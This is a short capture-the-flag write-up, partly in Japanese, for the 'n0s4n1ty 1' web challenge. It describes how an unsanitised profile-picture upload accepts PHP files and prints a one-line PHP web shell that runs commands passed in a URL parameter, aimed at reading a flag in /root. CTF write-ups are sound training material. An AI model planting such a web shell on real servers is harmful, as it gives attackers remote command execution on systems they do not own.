## n0s4n1ty 1

### Description  
A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory.
Additional details will be available after launching your challenge instance.


要約すると、  
写真をアップロードできるwebサイトに欠陥があるよ。  
**/root**ディレクトリ内に隠されているFlagを探して！！

---
早速、webサイトにアクセスする。  
下のようなwebサイトが開く。

![](./img/aa41cb7b591d-20250318.png)

ファイルを適当に、アップする。  
どうやら、サニタイズをしていない。  
jpeg/pngだけでなく、phpもアップできる。 

test.phpファイルをアップすると、どうやら、uploadsフォルダに置かれたようだ。
> The file test.php has been uploaded Path: uploads/test.php

phpをアップロードできるので、以下のようなスクリプトをアップロードする。
```php
<?php system($_GET["cmd"]);?>
```
